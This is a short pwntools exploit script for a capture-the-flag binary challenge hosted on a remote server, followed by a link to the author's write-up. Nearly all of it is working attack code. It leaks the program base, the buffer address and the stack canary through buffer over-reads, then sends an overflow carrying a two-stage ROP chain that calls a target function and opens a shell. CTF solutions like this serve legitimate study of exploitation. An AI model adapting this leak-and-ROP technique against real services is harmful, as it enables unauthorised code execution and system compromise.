from pwn import *
#r=process(["./chall21"])
r=remote('challenge.pwny.racing',40021)

def sendbuf(buf):
    r.recvuntil("buffer")
    r.sendline(buf)
    return r.recvline()[10:-1]

textaddr=unpack(sendbuf(b"A"*24)[24:].ljust(8,b'\0'),64)-0xc1d
print("Leaked text base addr:",hex(textaddr))

bufaddr=unpack(sendbuf(b"A"*64)[64:].ljust(8,b'\0'),64)-0x130
print("Leaked buf addr (and where /bin/bash will be):",hex(bufaddr))

canary=unpack(b'\0'+sendbuf(b"A"*73)[73:80],64)
print("Leaked canary:",hex(canary))

sendbuf((b'/bin/bash\0' #'/bin/bash' at bufaddr
         +p64(textaddr+0x9ac)).ljust(72,b'A') #pointer to TARGET and 'A' padding
        +p64(canary) #canary
        +b"B"*8 #rbp (useless)
        +p64(textaddr+0xc2a) #1st stage in rop chain
        +p64(0) #rbx=0
        +p64(0) #rbp=0
        +p64(bufaddr+len(b'/bin/bash\0')) #r12=addr(addr(TARGET))
        +p64(0) #r13=0
        +p64(0) #r14=0
        +p64(bufaddr) #r15=/bin/bash addr
        +p64(textaddr+0xc10)) #2nd stage in rop chain, jackpot!

# rop chain:
# 0x0000000000000c2a : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# set rbx=0, r12=addr(addr(TARGET)), r13=0, r14=0, r15=addr("/bin/bash")
# 0x0000000000000c10 : mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12 + rbx*8]
# move r15 into rdx (jackpot!), call [r12] (TARGET at 0x9ac)

r.sendline()
r.interactive()

# <shameless_plug>
# Writeup here: https://rkevin.dev/blog/pwny-racing-community-challenge-7-writeup/
# </shameless_plug>
